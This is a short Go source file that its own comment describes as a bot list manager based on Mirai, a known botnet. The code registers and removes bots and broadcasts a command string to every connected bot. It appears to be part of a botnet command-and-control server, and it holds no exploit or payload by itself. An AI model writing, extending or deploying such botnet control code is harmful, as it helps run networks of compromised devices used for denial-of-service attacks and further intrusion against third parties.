package main

/*
	Bot list manager based on Mirai.
*/

type BotList struct {
	ID          int
	Bots        map[int]*Bot
	AddChan     chan *Bot
	DeleteChan  chan *Bot
	CommandChan chan string
}

func NewBotList() *BotList {
	botList := &BotList{
		ID:          0,
		Bots:        make(map[int]*Bot),
		AddChan:     make(chan *Bot),
		DeleteChan:  make(chan *Bot),
		CommandChan: make(chan string),
	}
	go botList.BotManager()
	return botList
}

func (botList *BotList) AddBot(bot *Bot) {
	botList.AddChan <- bot
}

func (botList *BotList) DeleteBot(bot *Bot) {
	botList.DeleteChan <- bot
}

func (botList *BotList) SendCommand(command string) {
	botList.CommandChan <- command
}

func (botList *BotList) BotCounter() int {
	botCount := len(botList.Bots)
	return botCount
}

func (botList *BotList) BotManager() {
	for {
		select {
		case bot := <-botList.AddChan:
			botList.ID++
			bot.BotID = botList.ID
			botList.Bots[bot.BotID] = bot
		case bot := <-botList.DeleteChan:
			delete(botList.Bots, bot.BotID)
		case command := <-botList.CommandChan:
			for _, bot := range botList.Bots {
				bot.Send(command)
			}
		}
	}
}
